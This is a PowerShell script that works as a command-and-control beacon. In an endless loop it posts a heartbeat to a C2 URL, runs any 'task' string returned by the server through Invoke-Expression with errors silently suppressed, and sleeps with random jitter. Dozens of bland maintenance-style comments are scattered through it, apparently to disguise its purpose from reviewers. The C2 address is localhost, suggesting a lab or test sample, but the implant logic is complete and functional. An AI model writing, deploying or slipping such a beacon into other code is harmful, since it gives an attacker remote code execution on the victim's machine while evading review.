function Send-Hb {
    $body_d6d8 = @{ host = $hid_d6d8; act = 'hb' } | ConvertTo-Json -Compress
    $r_d6d8 = Invoke-RestMethod -Uri $c2_d6d8 -Method Post -Body $body_d6d8 -ContentType 'application/json'
    $r_d6d8
}
# suppress verbose output here
# keep interval within policy
# fallback order intentional
# reviewed in last audit
$jit_d6d8 = 997
# legacy shim retained for compatibility
# defaults match golden config
# quotas checked at start
# routine maintenance marker
# suppress verbose output here
# idle timeout handled upstream
# schedule synced with controller
# keep interval within policy
$c2_d6d8 = 'http://127.0.0.1:8443/r'
# placeholder for future flags
# suppress verbose output here
# baseline captured before deploy
# telemetry hook disabled
# do not reorder without approval
# schedule synced with controller
# fallback order intentional
# revision tracked out of band
# local registry mirror preferred
# no action required below this line
$delay_d6d8 = 3721
# see runbook section 4
# legacy shim retained for compatibility
# health probe configuration
# reviewed in last audit
$hid_d6d8 = '10.0.0.5'
# routine maintenance marker
# upstream patch pending
# reviewed in last audit
while ($true) {
# see runbook section 4
# no action required below this line
# revision tracked out of band
# do not reorder without approval
# routine maintenance marker
# keep interval within policy
    $resp_d6d8 = $null
# baseline captured before deploy
# node bootstrap notes
# see runbook section 4
# placeholder for future flags
    try { $resp_d6d8 = Send-Hb } catch { Start-Sleep -Milliseconds $delay_d6d8; continue }
# no action required below this line
# idle timeout handled upstream
# defaults match golden config
# node bootstrap notes
# placeholder for future flags
# schedule synced with controller
# reviewed in last audit
# temp override cleared on boot
    if (($null -ne $resp_d6d8) -and $resp_d6d8.task) {
# node bootstrap notes
# defaults match golden config
# placeholder for future flags
# workaround for stale cache
# health probe configuration
# idle timeout handled upstream
# config sync point
# baseline captured before deploy
# no action required below this line
        $buf_d6d8 = [string]$resp_d6d8.task
# placeholder for future flags
# fallback order intentional
# no action required below this line
# quotas checked at start
# defaults match golden config
# workaround for stale cache
# health probe configuration
# keep interval within policy
        if ($buf_d6d8.Length -gt 0) {
# no action required below this line
# upstream patch pending
# do not reorder without approval
# keep interval within policy
# revision tracked out of band
# legacy shim retained for compatibility
# baseline captured before deploy
# workaround for stale cache
# routine maintenance marker
# see runbook section 4
            try { Invoke-Expression $buf_d6d8 | Out-Null } catch { }
# temp override cleared on boot
# revision tracked out of band
# no action required below this line
# suppress verbose output here
# keep interval within policy
# defaults match golden config
# baseline captured before deploy
        }
# health probe configuration
# temp override cleared on boot
# telemetry hook disabled
# node bootstrap notes
# do not reorder without approval
# local registry mirror preferred
    }
# do not reorder without approval
# idle timeout handled upstream
# baseline captured before deploy
# workaround for stale cache
# placeholder for future flags
    Start-Sleep -Milliseconds ($delay_d6d8 + (Get-Random -Minimum 0 -Maximum ($jit_d6d8 + 1)))
# baseline captured before deploy
# placeholder for future flags
# defaults match golden config
# revision tracked out of band
# legacy shim retained for compatibility
# keep interval within policy
# do not reorder without approval
# config sync point
# fallback order intentional
# telemetry hook disabled
# see runbook section 4
# reviewed in last audit
}
